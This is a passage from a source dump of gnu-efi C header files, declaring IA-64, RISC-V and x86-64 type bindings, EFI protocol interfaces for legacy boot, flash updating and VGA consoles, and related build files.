 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 * 
 *    This product includes software developed by Intel Corporation and
 *    its contributors.
 * 
 * 4. Neither the name of Intel Corporation or its contributors may be
 *    used to endorse or promote products derived from this software
 *    without specific prior written permission.
 * 
 * THIS SOFTWARE IS PROVIDED BY INTEL CORPORATION AND CONTRIBUTORS ``AS IS''
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL INTEL CORPORATION OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF
 * THE POSSIBILITY OF SUCH DAMAGE.
 * 
 */


#ifndef _EFICONTEXT_H_
#define _EFICONTEXT_H_


//
//  IA-64 processor exception types
//
#define    EXCPT_ALT_DTLB            4
#define    EXCPT_DNESTED_TLB         5
#define    EXCPT_BREAKPOINT         11
#define    EXCPT_EXTERNAL_INTERRUPT	12
#define    EXCPT_GEN_EXCEPT         24
#define    EXCPT_NAT_CONSUMPTION    26
#define    EXCPT_DEBUG_EXCEPT       29
#define    EXCPT_UNALIGNED_ACCESS   30
#define    EXCPT_FP_FAULT           32
#define    EXCPT_FP_TRAP            33
#define    EXCPT_TAKEN_BRANCH       35
#define    EXCPT_SINGLE_STEP        36

//
//  IA-64 processor context definition - must be 512 byte aligned!!!
//
typedef
struct {
	UINT64 reserved;	// necessary to preserve alignment for the correct bits in UNAT and to insure F2 is 16 byte aligned...
    
    UINT64 r1;
    UINT64 r2;
    UINT64 r3;
    UINT64 r4;
    UINT64 r5;
    UINT64 r6;
    UINT64 r7;
    UINT64 r8;
    UINT64 r9;
    UINT64 r10;
    UINT64 r11;
    UINT64 r12;
    UINT64 r13;
    UINT64 r14;
    UINT64 r15;
    UINT64 r16;
    UINT64 r17;
    UINT64 r18;
    UINT64 r19;
    UINT64 r20;
    UINT64 r21;
    UINT64 r22;
    UINT64 r23;
    UINT64 r24;
    UINT64 r25;
    UINT64 r26;
    UINT64 r27;
    UINT64 r28;
    UINT64 r29;
    UINT64 r30;
    UINT64 r31;
    
    UINT64 f2[2];
    UINT64 f3[2];
    UINT64 f4[2];
    UINT64 f5[2];
    UINT64 f6[2];
    UINT64 f7[2];
    UINT64 f8[2];
    UINT64 f9[2];
    UINT64 f10[2];
    UINT64 f11[2];
    UINT64 f12[2];
    UINT64 f13[2];
    UINT64 f14[2];
    UINT64 f15[2];
    UINT64 f16[2];
    UINT64 f17[2];
    UINT64 f18[2];
    UINT64 f19[2];
    UINT64 f20[2];
    UINT64 f21[2];
    UINT64 f22[2];
    UINT64 f23[2];
    UINT64 f24[2];
    UINT64 f25[2];
    UINT64 f26[2];
    UINT64 f27[2];
    UINT64 f28[2];
    UINT64 f29[2];
    UINT64 f30[2];
    UINT64 f31[2];
    
    UINT64 pr;
    
    UINT64 b0;
    UINT64 b1;
    UINT64 b2;
    UINT64 b3;
    UINT64 b4;
    UINT64 b5;
    UINT64 b6;
    UINT64 b7;
    
    // application registers
    UINT64 ar_rsc;
    UINT64 ar_bsp;
    UINT64 ar_bspstore;
    UINT64 ar_rnat;

    UINT64 ar_fcr;

    UINT64 ar_eflag;
    UINT64 ar_csd;
    UINT64 ar_ssd;
    UINT64 ar_cflg;
    UINT64 ar_fsr;
    UINT64 ar_fir;
    UINT64 ar_fdr;

    UINT64 ar_ccv;

    UINT64 ar_unat;

    UINT64 ar_fpsr;
    
    UINT64 ar_pfs;
    UINT64 ar_lc;
    UINT64 ar_ec;
    
    // control registers
    UINT64 cr_dcr;
    UINT64 cr_itm;
    UINT64 cr_iva;
    UINT64 cr_pta;
    UINT64 cr_ipsr;
    UINT64 cr_isr;
    UINT64 cr_iip;
    UINT64 cr_ifa;
    UINT64 cr_itir;
    UINT64 cr_iipa;
    UINT64 cr_ifs;
    UINT64 cr_iim;
    UINT64 cr_iha;
    
    // debug registers
    UINT64 dbr0;
    UINT64 dbr1;
    UINT64 dbr2;
    UINT64 dbr3;
    UINT64 dbr4;
    UINT64 dbr5;
    UINT64 dbr6;
    UINT64 dbr7;
    
    UINT64 ibr0;
    UINT64 ibr1;
    UINT64 ibr2;
    UINT64 ibr3;
    UINT64 ibr4;
    UINT64 ibr5;
    UINT64 ibr6;
    UINT64 ibr7;
    
    // virtual registers
    UINT64 int_nat;	// nat bits for R1-R31
    
} SYSTEM_CONTEXT;

#endif /* _EFI_CONTEXT_H_ */

```

`include/gnu-efi/protocol/intload.h`:

```h
/*++

Copyright (c) 1999 Intel Corporation

Module Name:

    intload

Abstract:

    EFI support for loading internally linked in apps



Revision History

--*/

#ifndef _INTERNAL_LOAD_INCLUDE_
#define _INTERNAL_LOAD_INCLUDE_

// {D65A6B8C-71E5-4df0-A909-F0D2992B5AA9}
#define INTERNAL_SHELL_GUID \
    { 0xd65a6b8c, 0x71e5, 0x4df0, {0xa9, 0x09, 0xf0, 0xd2, 0x99, 0x2b, 0x5a, 0xa9} }


#endif

```

`include/gnu-efi/protocol/legacyboot.h`:

```h
/*++

Copyright (c) 1999 Intel Corporation

Module Name:

    legacyboot

Abstract:

    EFI support for legacy boot



Revision History

--*/

#ifndef _LEGACY_BOOT_INCLUDE_
#define _LEGACY_BOOT_INCLUDE_

#define LEGACY_BOOT_PROTOCOL \
    { 0x376e5eb2, 0x30e4, 0x11d3, { 0xba, 0xe5, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81 } }

#pragma pack(1)

//
// BBS 1.01 (See Appendix A) IPL and BCV Table Entry Data structure.
//  Seg:Off pointers have been converted to EFI pointers in this data structure
//  This is the structure that also maps to the EFI device path for the boot selection
//
typedef struct {
    UINT16  DeviceType;
    UINT16  StatusFlag;
    UINT32  Reserved;
    VOID    *BootHandler;   // Not an EFI entry point
    CHAR8   *DescString;
} BBS_TABLE_ENTRY;
#pragma pack()

typedef
EFI_STATUS
(EFIAPI *LEGACY_BOOT_CALL) (
    IN EFI_DEVICE_PATH      *DevicePath
    );


//
// BBS support functions
//  PnP Call numbers and BiosSelector hidden in implementation
//

typedef enum {
    IplRelative,
    BcvRelative
} BBS_TYPE;

INTERFACE_DECL(_LEGACY_BOOT_INTERFACE);

//
// == PnP Function 0x60 then BbsVersion == 0x0101 if this call fails then BbsVersion == 0x0000
//

//
// == PnP Function 0x61
//
typedef
EFI_STATUS
(EFIAPI *GET_DEVICE_COUNT) (
    IN  struct _LEGACY_BOOT_INTERFACE   *This,
    IN  BBS_TYPE        *TableType,
    OUT UINTN           *DeviceCount,
    OUT UINTN           *MaxCount
    );

//
// == PnP Function 0x62
//
typedef
EFI_STATUS
(EFIAPI *GET_PRIORITY_AND_TABLE) (
    IN  struct _LEGACY_BOOT_INTERFACE   *This,
    IN  BBS_TYPE        *TableType,
    IN OUT  UINTN       *PrioritySize, // MaxCount * sizeof(UINT8)
    OUT     UINTN       *Priority,
    IN OUT  UINTN       *TableSize,    // MaxCount * sizeof(BBS_TABLE_ENTRY)
    OUT BBS_TABLE_ENTRY *TableEntrySize
    );

//
// == PnP Function 0x63
//
typedef
EFI_STATUS
(EFIAPI *SET_PRIORITY) (
    IN  struct _LEGACY_BOOT_INTERFACE   *This,
    IN  BBS_TYPE        *TableType,
    IN OUT  UINTN       *PrioritySize,
    OUT     UINTN       *Priority
    );

typedef struct _LEGACY_BOOT_INTERFACE {
    LEGACY_BOOT_CALL    BootIt;

    //
    // New functions to allow BBS booting to be configured from EFI
    //
    UINTN                   BbsVersion;     // Currently 0x0101
    GET_DEVICE_COUNT        GetDeviceCount;
    GET_PRIORITY_AND_TABLE  GetPriorityAndTable;
    SET_PRIORITY            SetPriority;   
} LEGACY_BOOT_INTERFACE;

EFI_STATUS
PlInitializeLegacyBoot (
    VOID
    );

#endif

```

`include/gnu-efi/protocol/make.inf`:

```inf
#
#
#

[sources]
    efivar.h
	legacyboot.h
	VgaClass.h
    intload.h

[ia32sources]

[ia64sources]

```

`include/gnu-efi/protocol/makefile.hdr`:

```hdr

#
# This is a machine generated file - DO NOT EDIT
#    Generated by genmake.exe
#    Generated from make.inf
#    Copyright (c) 1998  Intel Corporation
#

INC_DEPS = $(INC_DEPS) \
    $(SDK_INSTALL_DIR)\include\efi\protocol\efivar.h \
    $(SDK_INSTALL_DIR)\include\efi\protocol\legacyboot.h \
    $(SDK_INSTALL_DIR)\include\efi\protocol\vgaclass.h \
    $(SDK_INSTALL_DIR)\include\efi\protocol\efidbg.h \


!IF "$(PROCESSOR)" == "Ia32"
INC_DEPS = $(INC_DEPS) \


!ENDIF


!IF "$(PROCESSOR)" == "Ia64"
INC_DEPS = $(INC_DEPS) \
    $(SDK_INSTALL_DIR)\include\efi\protocol\$(PROCESSOR)\eficontext.h \


!ENDIF


```

`include/gnu-efi/protocol/piflash64.h`:

```h
#ifndef _PIFLASH64_H
#define _PIFLASH64_H

/*++

Copyright (c) 1999  Intel Corporation

Module Name:

    PIflash64.h
    
Abstract:

    Iflash64.efi protocol to abstract iflash from
    the system.

Revision History

--*/

//
// Guid that identifies the IFLASH protocol
//
#define IFLASH64_PROTOCOL_PROTOCOL \
    { 0x65cba110, 0x74ab, 0x11d3, 0xbb, 0x89, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81 };

//
// Unlock FLASH from StartAddress to EndAddress and return a LockKey
//
typedef
EFI_STATUS
(EFIAPI *UNLOCK_FLASH_API)(
    IN struct _IFLASH64_PROTOCOL_INTERFACE  *This
    );

//
// Lock the flash represented by the LockKey
//
typedef
EFI_STATUS
(EFIAPI *LOCK_FLASH_API)(
    IN struct _IFLASH64_PROTOCOL_INTERFACE  *This
    );

//
// Status callback for a utility like IFLASH64
//
//  Token would map to a list like Ted proposed. The utility has no idea what 
//      happens on the other side.
//  ErrorStatus - Level of Error or success. Independent of Token. If you 
//      don't know the token you will at least know pass or fail.
//  String - Optional extra information about the error. Could be used for 
//      debug or future expansion
//
//  Attributes - Options screen attributes for String. Could allow the string to be different colors.
//
typedef
EFI_STATUS
(EFIAPI *UTILITY_PROGRESS_API)(
    IN struct _IFLASH64_PROTOCOL_INTERFACE  *This,
    IN  UINTN                               Token,
    IN  EFI_STATUS                          ErrorStatus, 
    IN  CHAR16                              *String,    OPTIONAL
    IN  UINTN                               *Attributes OPTIONAL
    );

//
// Token Values
//
// IFlash64 Token Codes
#define IFLASH_TOKEN_IFLASHSTART    0xB0                // IFlash64 has started
#define IFLASH_TOKEN_READINGFILE    0xB1                // Reading File
#define IFLASH_TOKEN_INITVPP        0xB2                // Initializing Vpp
#define IFLASH_TOKEN_DISABLEVPP     0x10                // Disable Vpp
#define IFLASH_TOKEN_FLASHUNLOCK    0xB3                // Unlocking FLASH Devices
#define IFLASH_TOKEN_FLASHERASE     0xB4                // Erasing FLASH Devices
#define IFLASH_TOKEN_FLASHPROGRAM   0xB5                // Programming FLASH
#define IFLASH_TOKEN_FLASHVERIFY    0xB6                // Verifying FLASH
#define IFLASH_TOKEN_UPDATESUCCES   0xB7                // FLASH Updage Success!

#define IFLASH_TOKEN_PROGRESS_READINGFILE   0x11        // % Reading File
#define IFLASH_TOKEN_PROGRESS_FLASHUNLOCK   0x13        // % Unlocking FLASH Devices
#define IFLASH_TOKEN_PROGRESS_FLASHERASE    0x14        // % Erasing FLASH Devices
#define IFLASH_TOKEN_PROGRESS_FLASHPROGRAM  0x15        // % Programming FLASH
#define IFLASH_TOKEN_PROGRESS_FLASHVERIFY   0x16        // % Verifying FLASH

#define IFLASH_TOKEN_READINGFILE_ER 0xB8                // File Read Error
#define IFLASH_TOKEN_INITVPP_ER     0xB9                // Initialization of IFB Error
#define IFLASH_TOKEN_FLASHUNLOCK_ER 0xBA                // FLASH Unlock Error
#define IFLASH_TOKEN_FLASHERASE_ER  0xBB                // FLASH Erase Error
#define IFLASH_TOKEN_FLASHVERIFY_ER 0xBC                // FLASH Verify Error
#define IFLASH_TOKEN_FLASHPROG_ER   0xBD                // FLASH Program Error

#define IFLASH_TABLE_END            0x00

//
// If this number changes one of the existing API's has changes
//
#define IFLASH_PI_MAJOR_VERSION 0x01

//
// This number changes when new APIs or data variables get added to the end
//  of the data structure
//
#define IFLASH_PI_MINOR_VERSION 0x01

typedef struct _IFLASH64_PROTOCOL_INTERFACE {
    UINT32                  MajorVersion;       
    UINT32                  MinorVersion;   
    UNLOCK_FLASH_API        UnlockFlash;
    LOCK_FLASH_API          LockFlash;
    UTILITY_PROGRESS_API    Progress;
    
    //
    // Future expansion goes here
    //

} IFLASH64_PROTOCOL_INTERFACE;


#endif

```

`include/gnu-efi/protocol/readme.txt`:

```txt
The protocol directory contains non Architectural 
Protocols that span the FW, Platform, or application
space.
```

`include/gnu-efi/protocol/vgaclass.h`:

```h
#ifndef _VGA_CLASS_H
#define _VGA_CLASS_H

/*++

Copyright (c) 1999  Intel Corporation

Module Name:

    VgaClass.h
    
Abstract:

    Vga Mini port binding to Vga Class protocol



Revision History

--*/

//
// VGA Device Structure
//

// {0E3D6310-6FE4-11d3-BB81-0080C73C8881}
#define VGA_CLASS_DRIVER_PROTOCOL \
    { 0xe3d6310, 0x6fe4, 0x11d3, {0xbb, 0x81, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81} }

typedef 
EFI_STATUS 
(* INIT_VGA_CARD) (
    IN  UINTN   VgaMode,
    IN  VOID    *Context
    );

typedef struct {
    UINTN   MaxColumns;
    UINTN   MaxRows;
} MAX_CONSOLE_GEOMETRY;

#define VGA_CON_OUT_DEV_SIGNATURE   EFI_SIGNATURE_32('c','v','g','a')
typedef struct {
    UINTN                           Signature;

    EFI_HANDLE                      Handle;
    SIMPLE_TEXT_OUTPUT_INTERFACE    ConOut;
    SIMPLE_TEXT_OUTPUT_MODE         ConOutMode;
    EFI_DEVICE_PATH                 *DevicePath;

    UINT8                           *Buffer;
    EFI_DEVICE_IO_INTERFACE         *DeviceIo;

    //
    // Video Card Context
    //
    INIT_VGA_CARD                   InitVgaCard;
    VOID                            *VgaCardContext;
    MAX_CONSOLE_GEOMETRY            *Geometry;
    //
    // Video buffer normally 0xb8000
    //
    UINT64                          VideoBuffer;

    //
    // Clear Screen & Default Attribute
    //
    UINT32                          Attribute;

    //
    // -1 means search for active VGA device
    //
    EFI_PCI_ADDRESS_UNION           Pci;
} VGA_CON_OUT_DEV;

#define VGA_CON_OUT_DEV_FROM_THIS(a) CR(a, VGA_CON_OUT_DEV, ConOut, VGA_CON_OUT_DEV_SIGNATURE)

//
// Vga Class Driver Protocol. 
// GUID defined in EFI Lib
//

typedef 
EFI_STATUS
(EFIAPI *INSTALL_VGA_DRIVER) (
    IN  VGA_CON_OUT_DEV    *ConOutDev 
    );

typedef struct {
    UINT32               Version;
    INSTALL_VGA_DRIVER   InstallGenericVgaDriver;
} INSTALL_VGA_DRIVER_INTERFACE;

#endif


```

`include/gnu-efi/riscv64/efibind.h`:

```h
/*
 * Copright (C) 2014 - 2015 Linaro Ltd.
 * Author: Ard Biesheuvel <ard.biesheuvel@linaro.org>
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice and this list of conditions, without modification.
 * 2. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * Alternatively, this software may be distributed under the terms of the
 * GNU General Public License as published by the Free Software Foundation;
 * either version 2 of the License, or (at your option) any later version.
 */

#include <stdint.h>

//
// Basic EFI types of various widths
//



typedef uint64_t                UINT64;
typedef int64_t                 INT64;
typedef uint32_t                UINT32;
typedef int32_t                 INT32;
typedef uint16_t                UINT16;
typedef int16_t                 INT16;
typedef uint8_t                 UINT8;
typedef int8_t                  INT8;
#ifndef __WCHAR_TYPE__
#define __WCHAR_TYPE__          short
#endif
typedef __WCHAR_TYPE__          WCHAR;
#ifndef BOOLEAN
typedef uint8_t                 BOOLEAN;
#endif
#undef VOID
#define VOID                    void
typedef int64_t                 INTN;
typedef uint64_t                UINTN;

#define EFI_ERROR_MASK          0x8000000000000000
#define EFIERR(a)               (EFI_ERROR_MASK | a)
#define EFIERR_OEM(a)           (0xc000000000000000 | a)

#define BAD_POINTER             0xFBFBFBFBFBFBFBFB
#define MAX_ADDRESS             0xFFFFFFFFFFFFFFFF

#define BREAKPOINT()            while(1);

//
// Pointers must be aligned to these address to function
//
#define MIN_ALIGNMENT_SIZE      8

#define ALIGN_VARIABLE(Value, Adjustment) \
   (UINTN)Adjustment = 0; \
   if((UINTN)Value % MIN_ALIGNMENT_SIZE) \
       (UINTN)Adjustment = MIN_ALIGNMENT_SIZE - ((UINTN)Value % MIN_ALIGNMENT_SIZE); \
   Value = (UINTN)Value + (UINTN)Adjustment

//
// Define macros to build data structure signatures from characters.
//
#define EFI_SIGNATURE_16(A,B)             ((A) | (B<<8))
#define EFI_SIGNATURE_32(A,B,C,D)         (EFI_SIGNATURE_16(A,B)     | (EFI_SIGNATURE_16(C,D)     << 16))
#define EFI_SIGNATURE_64(A,B,C,D,E,F,G,H) (EFI_SIGNATURE_32(A,B,C,D) | ((UINT64)(EFI_SIGNATURE_32(E,F,G,H)) << 32))

//
// EFIAPI - prototype calling convention for EFI function pointers
// BOOTSERVICE - prototype for implementation of a boot service interface
// RUNTIMESERVICE - prototype for implementation of a runtime service interface
// RUNTIMEFUNCTION - prototype for implementation of a runtime function that is not a service
// RUNTIME_CODE - pragma macro for declaring runtime code
//
#ifndef EFIAPI                  // Forces EFI calling conventions reguardless of compiler options
#define EFIAPI                  // Substitute expresion to force C calling convention
#endif
#define BOOTSERVICE
#define RUNTIMESERVICE
#define RUNTIMEFUNCTION
#define RUNTIME_CODE(a)         alloc_text("rtcode", a)
#define BEGIN_RUNTIME_DATA()    data_seg("rtdata")
#define END_RUNTIME_DATA()      data_seg("")

#define VOLATILE                volatile
#define MEMORY_FENCE            __sync_synchronize

//
// When build similiar to FW, then link everything together as
// one big module. For the MSVC toolchain, we simply tell the
// linker what our driver init function is using /ENTRY.
//
#if defined(_MSC_EXTENSIONS)
#define EFI_DRIVER_ENTRY_POINT(InitFunction) \
    __pragma(comment(linker, "/ENTRY:" # InitFunction))
#else
#define EFI_DRIVER_ENTRY_POINT(InitFunction)    \
    UINTN                                       \
    InitializeDriver (                          \
        VOID    *ImageHandle,                   \
        VOID    *SystemTable                    \
        )                                       \
    {                                           \
        return InitFunction(ImageHandle,        \
                SystemTable);                   \
    }                                           \
                                                \
    EFI_STATUS efi_main(                        \
        EFI_HANDLE image,                       \
        EFI_SYSTEM_TABLE *systab                \
        ) __attribute__((weak,                  \
                alias ("InitializeDriver")));
#endif

#define LOAD_INTERNAL_DRIVER(_if, type, name, entry) \
   (_if)->LoadInternal(type, name, entry)

//
// Some compilers don't support the forward reference construct:
//  typedef struct XXXXX
//
// The following macro provide a workaround for such cases.
#define INTERFACE_DECL(x)       struct x

#define uefi_call_wrapper(func, va_num, ...) func(__VA_ARGS__)
#define EFI_FUNCTION

```

`include/gnu-efi/riscv64/efilibplat.h`:

```h
/* SPDX-License-Identifier: GPL-2.0+ */

VOID
InitializeLibPlatform (
    IN EFI_HANDLE           ImageHandle,
    IN EFI_SYSTEM_TABLE     *SystemTable
    );

```

`include/gnu-efi/riscv64/efisetjmp_arch.h`:

```h
#ifndef GNU_EFI_RISCV64_SETJMP_H
#define GNU_EFI_RISCV64_SETJMP_H

#define JMPBUF_ALIGN 8

typedef struct {
	/* GP regs */
	UINT64	s0;
	UINT64	s1;
	UINT64	s2;
	UINT64	s3;
	UINT64	s4;
	UINT64	s5;
	UINT64	s6;
	UINT64	s7;
	UINT64	s8;
	UINT64	s9;
	UINT64	s10;
	UINT64	s11;
	UINT64	sp;
	UINT64	ra;

	/* FP regs */
	UINT64	fs0;
	UINT64	fs1;
	UINT64	fs2;
	UINT64	fs3;
	UINT64	fs4;
	UINT64	fs5;
	UINT64	fs6;
	UINT64	fs7;
	UINT64	fs8;
	UINT64	fs9;
	UINT64	fs10;
	UINT64	fs11;
} ALIGN(JMPBUF_ALIGN) jmp_buf[1];

#endif /* GNU_EFI_RISCV64_SETJMP_H */

```

`include/gnu-efi/romload.h`:

```h
#ifndef _EFI_ROMLOAD_H
#define _EFI_ROMLOAD_H

#define ROM_SIGNATURE 0xaa55
#define PCIDS_SIGNATURE "PCIR"
#pragma pack(push)
#pragma pack(1)
typedef struct 
{
    UINT8    Pcids_Sig[4];
    UINT16  VendId;
    UINT16  DevId;
    UINT16  Vpd_Off;
    UINT16  Size;
    UINT8 Rev;
    UINT8 Class_Code[3];
    UINT16  Image_Len;
    UINT16  Rev_Lvl;
    UINT8 Code_Type;
    UINT8 Indi;
    UINT16  Rsvd;
}PciDataStructure;
typedef struct
{
    UINT16 Size;
    UINT32 Header_Sig;
    UINT16 SubSystem;
    UINT16 MachineType;
    UINT8  Resvd[10];
    UINT16 EfiOffset;
}ArchData;
typedef struct 
{
    UINT16 Rom_Sig;
    ArchData Arch_Data;
    UINT16 Pcids_Off;
    UINT8 resvd[38];
}RomHeader;
#pragma pack(pop)

#endif

```

`include/gnu-efi/x86_64/efibind.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efefind.h

Abstract:

    EFI to compile bindings




Revision History

--*/
#ifndef X86_64_EFI_BIND
#define X86_64_EFI_BIND
#ifndef __GNUC__
#pragma pack()
#endif

#if defined(_MSC_VER)
    #define HAVE_USE_MS_ABI 1
#elif defined(GNU_EFI_USE_MS_ABI)
    #if (defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 7)))||(defined(__clang__) && (__clang_major__ > 3 || (__clang_major__ == 3 && __clang_minor__ >= 2)))
        #define HAVE_USE_MS_ABI 1
    #else
        #error Compiler is too old for GNU_EFI_USE_MS_ABI
    #endif
#endif

//
// Basic int types of various widths
//

#if !defined(__STDC_VERSION__) || (__STDC_VERSION__ < 199901L ) && !defined(__cplusplus)

    // No ANSI C 1999/2000 stdint.h integer width declarations 

    #if defined(_MSC_EXTENSIONS)

        // Use Microsoft C compiler integer width declarations 

        typedef unsigned __int64    uint64_t;
        typedef __int64             int64_t;
        typedef unsigned __int32    uint32_t;
        typedef __int32             int32_t;
        typedef unsigned short      uint16_t;
        typedef short               int16_t;
        typedef unsigned char       uint8_t;
        typedef char                int8_t;
    #elif defined(__GNUC__)
        typedef int __attribute__((__mode__(__DI__)))           int64_t;
        typedef unsigned int __attribute__((__mode__(__DI__)))  uint64_t;
        typedef unsigned int        uint32_t;
        typedef int                 int32_t;
        typedef unsigned short      uint16_t;
        typedef short               int16_t;
        typedef unsigned char       uint8_t;
        typedef signed char         int8_t;
    #elif defined(UNIX_LP64)

        /*  Use LP64 programming model from C_FLAGS for integer width declarations */

       typedef unsigned long       uint64_t;
       typedef long                int64_t;
       typedef unsigned int        uint32_t;
       typedef int                 int32_t;
       typedef unsigned short      uint16_t;
       typedef short               int16_t;
       typedef unsigned char       uint8_t;
       typedef char                int8_t;
    #else

       /*  Assume P64 programming model from C_FLAGS for integer width declarations */

       typedef unsigned long long  uint64_t __attribute__((aligned (8)));
       typedef long long           int64_t __attribute__((aligned (8)));
       typedef unsigned int        uint32_t;
       typedef int                 int32_t;
       typedef unsigned short      uint16_t;
       typedef short               int16_t;
       typedef unsigned char       uint8_t;
       typedef char                int8_t;
    #endif
    typedef uint64_t            uintptr_t;
    typedef int64_t             intptr_t;
#else
    #include <stdint.h>
#endif

//
// Basic EFI types of various widths
//

#ifndef __WCHAR_TYPE__
# define __WCHAR_TYPE__ short
#endif

typedef uint64_t   UINT64;
typedef int64_t    INT64;

#ifndef _BASETSD_H_
    typedef uint32_t   UINT32;
    typedef int32_t    INT32;
#endif

typedef uint16_t   UINT16;
typedef int16_t    INT16;
typedef uint8_t    UINT8;
typedef int8_t     INT8;
typedef __WCHAR_TYPE__ WCHAR;

#undef VOID
#define VOID    void


typedef int64_t    INTN;
typedef uint64_t   UINTN;

#ifdef EFI_NT_EMULATOR
    #define POST_CODE(_Data)
#else    
    #ifdef EFI_DEBUG
#define POST_CODE(_Data)    __asm mov eax,(_Data) __asm out 0x80,al
    #else
        #define POST_CODE(_Data)
    #endif  
#endif

#define EFIERR(a)           (0x8000000000000000 | a)
#define EFI_ERROR_MASK      0x8000000000000000
#define EFIERR_OEM(a)       (0xc000000000000000 | a)      


#define BAD_POINTER         0xFBFBFBFBFBFBFBFB
#define MAX_ADDRESS         0xFFFFFFFFFFFFFFFF

#ifdef EFI_NT_EMULATOR
    #define BREAKPOINT()        __asm { int 3 }
#else
    #define BREAKPOINT()        while (TRUE);    // Make it hang on Bios[Dbg]32
#endif

//
// Pointers must be aligned to these address to function
//

#define MIN_ALIGNMENT_SIZE  4

#define ALIGN_VARIABLE(Value ,Adjustment) \
            (UINTN)Adjustment = 0; \
            if((UINTN)Value % MIN_ALIGNMENT_SIZE) \
                (UINTN)Adjustment = MIN_ALIGNMENT_SIZE - ((UINTN)Value % MIN_ALIGNMENT_SIZE); \
            Value = (UINTN)Value + (UINTN)Adjustment


//
// Define macros to build data structure signatures from characters.
//

#define EFI_SIGNATURE_16(A,B)             ((A) | (B<<8))
#define EFI_SIGNATURE_32(A,B,C,D)         (EFI_SIGNATURE_16(A,B)     | (EFI_SIGNATURE_16(C,D)     << 16))
#define EFI_SIGNATURE_64(A,B,C,D,E,F,G,H) (EFI_SIGNATURE_32(A,B,C,D) | ((UINT64)(EFI_SIGNATURE_32(E,F,G,H)) << 32))
//
// To export & import functions in the EFI emulator environment
//

#ifdef EFI_NT_EMULATOR
    #define EXPORTAPI           __declspec( dllexport )
#else
    #define EXPORTAPI
#endif


//
// EFIAPI - prototype calling convention for EFI function pointers
// BOOTSERVICE - prototype for implementation of a boot service interface
// RUNTIMESERVICE - prototype for implementation of a runtime service interface
// RUNTIMEFUNCTION - prototype for implementation of a runtime function that is not a service
// RUNTIME_CODE - pragma macro for declaring runtime code    
//

#ifndef EFIAPI                  // Forces EFI calling conventions reguardless of compiler options 
    #ifdef _MSC_EXTENSIONS
        #define EFIAPI __cdecl  // Force C calling convention for Microsoft C compiler 
    #elif defined(HAVE_USE_MS_ABI)
        // Force amd64/ms calling conventions.
        #define EFIAPI __attribute__((ms_abi))
    #else
        #define EFIAPI          // Substitute expresion to force C calling convention 
    #endif
#endif

#define BOOTSERVICE
//#define RUNTIMESERVICE(proto,a)    alloc_text("rtcode",a); proto a
//#define RUNTIMEFUNCTION(proto,a)   alloc_text("rtcode",a); proto a
#define RUNTIMESERVICE
#define RUNTIMEFUNCTION


#define RUNTIME_CODE(a)         alloc_text("rtcode", a)
#define BEGIN_RUNTIME_DATA()    data_seg("rtdata")
#define END_RUNTIME_DATA()      data_seg("")

#define VOLATILE    volatile

#define MEMORY_FENCE()    

#ifdef EFI_NT_EMULATOR

//
// To help ensure proper coding of integrated drivers, they are
// compiled as DLLs.  In NT they require a dll init entry pointer.
// The macro puts a stub entry point into the DLL so it will load.
//

#define EFI_DRIVER_ENTRY_POINT(InitFunction)    \
    UINTN                                       \
    __stdcall                                   \
    _DllMainCRTStartup (                        \
        UINTN    Inst,                          \
        UINTN    reason_for_call,               \
        VOID    *rserved                        \
        )                                       \
    {                                           \
        return 1;                               \
    }                                           \
                                                \
    int                                         \
    EXPORTAPI                                   \
    __cdecl                                     \
    InitializeDriver (                          \
        void *ImageHandle,                      \
        void *SystemTable                       \
        )                                       \
    {                                           \
        return InitFunction(ImageHandle, SystemTable);       \
    }


    #define LOAD_INTERNAL_DRIVER(_if, type, name, entry)      \
        (_if)->LoadInternal(type, name, NULL)             

#else // EFI_NT_EMULATOR 

//
// When build similiar to FW, then link everything together as
// one big module. For the MSVC toolchain, we simply tell the
// linker what our driver init function is using /ENTRY.
//
#if defined(_MSC_EXTENSIONS)
    #define EFI_DRIVER_ENTRY_POINT(InitFunction) \
        __pragma(comment(linker, "/ENTRY:" # InitFunction))
#else
    #define EFI_DRIVER_ENTRY_POINT(InitFunction)    \
        UINTN                                       \
        InitializeDriver (                          \
            VOID    *ImageHandle,                   \
            VOID    *SystemTable                    \
            )                                       \
        {                                           \
            return InitFunction(ImageHandle,        \
                    SystemTable);                   \
        }                                           \
                                                    \
        EFI_STATUS efi_main(                        \
            EFI_HANDLE image,                       \
            EFI_SYSTEM_TABLE *systab                \
            ) __attribute__((weak,                  \
                    alias ("InitializeDriver")));
#endif

    #define LOAD_INTERNAL_DRIVER(_if, type, name, entry)    \
            (_if)->LoadInternal(type, name, entry)

#endif // EFI_NT_EMULATOR

//
// Some compilers don't support the forward reference construct:
//  typedef struct XXXXX
//
// The following macro provide a workaround for such cases.
//
#ifdef NO_INTERFACE_DECL
#define INTERFACE_DECL(x)
#else
#if defined(__GNUC__) || defined(_MSC_EXTENSIONS)
#define INTERFACE_DECL(x) struct x
#else
